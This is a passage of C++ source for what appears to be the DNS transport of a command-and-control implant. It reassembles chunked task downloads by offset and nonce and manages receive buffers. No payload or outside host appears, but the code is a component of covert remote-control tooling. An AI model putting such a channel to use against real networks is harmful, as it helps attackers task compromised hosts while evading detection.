                    // Server sent different offset than we requested
                    if (offset == 0 && chunkLen >= 9) {
                        // Server is starting a new task - extract and check nonce
                        ULONG newNonce = 0;
                        newNonce |= (ULONG)binBuf[headerSize + 1];
                        newNonce |= ((ULONG)binBuf[headerSize + 2] << 8);
                        newNonce |= ((ULONG)binBuf[headerSize + 3] << 16);
                        newNonce |= ((ULONG)binBuf[headerSize + 4] << 24);
                        
                        if (newNonce != 0 && newNonce != this->downTaskNonce) {
                            // New task started - reset and accept
                            ResetDownload();
                            isNewTask = TRUE;
                            chunkTaskNonce = newNonce;
                        } else {
                            // Same task but server is resending from start - something wrong
                            // Request the offset we actually need by returning
                            return;
                        }
                    } else if (offset < reqOffset) {
                        // Server sent an earlier offset - data we already have, ignore
                        return;
                    } else {
                        // Server sent a later offset - we're missing data, request resend
                        // by not processing this and waiting for correct offset
                        return;
                    }
                }
                
                // Initialize new download buffer if needed
                if (isNewTask) {
                    if (this->downBuf && this->downTotal) {
                        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                    }
                    this->downBuf = (BYTE*)MemAllocLocal(total);
                    if (!this->downBuf) {
                        this->downTotal = 0;
                        this->downFilled = 0;
                        return;
                    }
                    this->downTotal = total;
                    this->downFilled = 0;
                    this->downAckOffset = 0;
                    if (offset == 0 && chunkTaskNonce != 0) {
                        this->downTaskNonce = chunkTaskNonce;
                    }
                    
                    // For new task, we must start at offset 0
                    if (offset != 0) {
                        return;
                    }
                }

                // Copy chunk data to buffer
                ULONG end = offset + chunkLen;
                if (end > total)
                    end = total;
                ULONG n = end - offset;
                memcpy(this->downBuf + offset, binBuf + headerSize, n);
                
                // Update progress
                if (offset + n > this->downFilled) {
                    this->downFilled = offset + n;
                }
                this->downAckOffset = this->downFilled;

                if (this->downFilled >= this->downTotal) {
                    FinalizeDownload();
                }
                return;
            }
        }

        if (binLen > (int)headerSize) {
            ResetDownload();
                return;
            }

        this->recvData = (BYTE*)MemAllocLocal(binLen);
        if (!this->recvData)
            return;
        memcpy(this->recvData, binBuf, binLen);
        this->recvSize = (int)binLen;
    }
}

BYTE* ConnectorDNS::RecvData()
{
    return this->recvData;
}

int ConnectorDNS::RecvSize()
{
    return this->recvSize;
}

void ConnectorDNS::RecvClear()
{
	if (this->recvData) {
		MemFreeLocal((LPVOID*)&this->recvData, (ULONG)this->recvSize);
		this->recvData = NULL;
		this->recvSize = 0;
	}
}

BOOL ConnectorDNS::IsBusy() const
{
    return (this->downBuf != NULL) || this->hasPendingTasks;
}
